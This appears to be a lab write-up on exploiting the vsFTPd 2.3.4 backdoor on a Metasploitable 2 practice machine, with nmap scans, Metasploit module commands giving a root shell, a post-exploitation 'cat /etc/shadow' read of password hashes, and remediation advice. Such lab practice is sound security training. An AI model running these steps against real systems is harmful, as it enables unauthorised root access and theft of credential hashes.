# Metasploitable 2 - vsFTPd 2.3.4 Backdoor Exploitation

## Overview
Exploitation of the vsFTPd 2.3.4 backdoor vulnerability (CVE-2011-2523) on Metasploitable 2.

**Target:** 192.168.100.20 (Metasploitable 2)  
**Vulnerability:** vsFTPd 2.3.4 Backdoor  
**Date:** 2025-12-22

## Tools Used
- Nmap
- Metasploit Framework

## Methodology

### 1. Network Discovery
```bash
nmap -n 192.168.100.0/24
```

### 2. Port Scanning
```bash
nmap -n -p- 192.168.100.20
```

### 3. Service Enumeration
```bash
nmap -n -sV -p 21,22,80 192.168.100.20
```

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
22/tcp open  ssh     OpenSSH 4.7p1
80/tcp open  http    Apache httpd 2.2.8
```

### 4. Exploitation
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.20
exploit
```

### 5. Post-Exploitation
```bash
whoami          # root
id              # uid=0(root) gid=0(root)
hostname        # metasploitable
uname -a        # Linux metasploitable 2.6.24-16-server
cat /etc/shadow # Password hashes
```

## Findings
- ✅ Successfully exploited vsFTPd 2.3.4 backdoor
- ✅ Obtained root shell with uid=0
- ✅ Full system compromise achieved
- ⚠️ No authentication required for exploitation
- ⚠️ No logging/detection mechanisms in place

## Screenshots

### Nmap Service Detection
![Nmap Scan](../images/metasploitable-nmap-scan.png)

### Metasploit Exploit Success
![Exploit Success](../images/metasploitable-exploit-success.png)

### Root Access Proof
![Whoami Root](../images/metasploitable-whoami-root.png)

### System Information
![System Info](../images/metasploitable-system-info. png)

## Notes
- Exploit was successful on first attempt
- No defensive measures detected
- Vulnerability is well-known and easily exploitable
- This demonstrates the importance of: 
  - Keeping software updated
  - Network segmentation
  - Intrusion detection systems
  - Security monitoring

## Remediation
- Update vsFTPd to version 2.3.5 or later
- Implement firewall rules restricting FTP access
- Deploy IDS/IPS to detect exploitation attempts
- Monitor for suspicious FTP connections
- Consider disabling FTP in favor of SFTP
